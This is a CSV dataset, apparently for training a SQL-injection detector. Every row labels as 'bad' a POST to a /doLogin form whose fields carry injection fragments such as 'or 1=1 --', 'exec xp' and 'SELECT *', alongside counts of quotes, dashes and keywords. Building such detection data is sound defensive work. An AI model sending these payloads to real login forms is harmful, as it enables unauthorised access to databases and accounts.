method,path,body,single_q,double_q,dashes,braces,spaces,badwords,class
POST,b'/doLogin',b'uid=bfilename&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=char%4039%41%2b%40SELECT&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=delete&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=desc&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=distinct&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=exec%20sp&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,0,0,0,1,0,bad
POST,b'/doLogin',b'uid=exec%20xp&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,0,0,0,1,0,bad
POST,b'/doLogin',b'uid=handler&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=having&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=insert&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=like&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=limit&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=or%200%3d0%20%23&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,0,0,0,2,0,bad
POST,b'/doLogin',b'uid=or%200%3d0%20--&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,0,1,0,2,0,bad
POST,b'/doLogin',b'uid=or%201%3d1%20--&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,0,1,0,2,0,bad
POST,b'/doLogin',b'uid=or%201%3d1&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,0,0,0,1,0,bad
POST,b'/doLogin',b'uid=or%201%3d1--&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,0,1,0,1,0,bad
POST,b'/doLogin',b'uid=or&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=order%20by&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,0,0,0,1,1,bad
POST,b'/doLogin',b'uid=procedure&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=replace&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=select&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,0,0,0,0,1,bad
POST,b'/doLogin',b'uid=to_timestamp_tz&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=truncate&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=tz_offset&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=update&passw=%5Cx27%5Cx6F%5Cx72+SELECT+*&btnSubmit=Login',0,0,0,0,0,0,bad
